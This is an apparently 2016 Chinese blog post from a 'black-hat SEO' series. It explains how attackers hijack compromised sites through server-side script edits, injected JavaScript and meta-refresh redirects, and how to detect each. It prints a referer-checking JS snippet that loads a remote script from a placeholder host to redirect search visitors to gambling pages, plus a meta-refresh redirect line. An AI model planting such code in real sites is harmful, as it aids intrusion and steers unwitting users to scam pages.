---
title: 【黑帽SEO系列】网页劫持
date: 2016-10-12 10:25:13
comments: true
tags: 
- 黑帽SEO
- 网页劫持
categories: 黑产研究
password:
copyright: true
---
　　网页劫持是目前黑帽SEO或者说黑产最喜欢的一种网页引流方式，此手法往往通过入侵政府、教育机构网站（权重高），修改网站源代码、放寄生虫程序、设置二级目录反向代理等实现。网页劫持可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；表现形式可以是劫持跳转，也可以是劫持呈现的网页内容，目前被广泛应用于私服、博彩等暴利行业。

### 服务端劫持
服务端劫持也称为全局劫持，手法为修改网站动态语言文本，判断访问来源控制返回内容，从来达到网站劫持的目的。
#### asp/aspx/php劫持
　　Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本， 然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问，则返回正常页面。

### 客户端劫持
客户端劫持的手法也很多，但主要就是2种：js劫持、Header劫持。
#### js劫持
js劫持目的：通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。
js植入手法：可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。
#### js劫持案例
效果：通过搜索引擎搜索点击页面（执行一段js）跳转到博彩页面；直接输入网址访问网页，跳转到404页面。
代码：
```bash
today=new Date();
today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referer;
if(regexp.test(where)){
document.write ('<script language="javascript" type="text/javascript" src="http://www.xxx.com/test.js"></script>');
}
else
{
window.location.href="../../404.htm";
}
```
分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。
#### header劫持
在源代码中写入以下代码：
```bash
<meta http-equiv=“refresh“ content=“10; url=http://thief.one“>
```
利用的就是Meta Refresh Tag（自动转向），将流量引走。

### 手法对比
#### 客户端劫持与服务端区别
客户端劫持：每次访问网页从服务端获取到的网页代码都是相同的，只是控制了网页代码在浏览器中呈现的效果（比如是否进行跳转等）。
服务端劫持：改变了每次访问网页从服务端获取到的网页代码。
#### 客户端劫持与服务端判断方法
客户端劫持的判断方法：只需观察浏览器呈现的网页前端代码，查看是否引用了不当的js，或者其它敏感内容。
服务端劫持的判断方法：可以通过观察网站后端代码，或者通过改变ip，包头等方式，观察放回源码是否不同。

结语：*网页劫持的方法还有很多，我了解的大概只是皮毛，黑帽SEO技术的水很深，前路漫漫。*

### 传送门

>[【黑帽SEO系列】基础知识](http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/)
[【黑帽SEO系列】暗链](http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/)
[【黑帽SEO系列】网页劫持](http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/)
[【黑帽SEO系列】页面跳转](http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/)

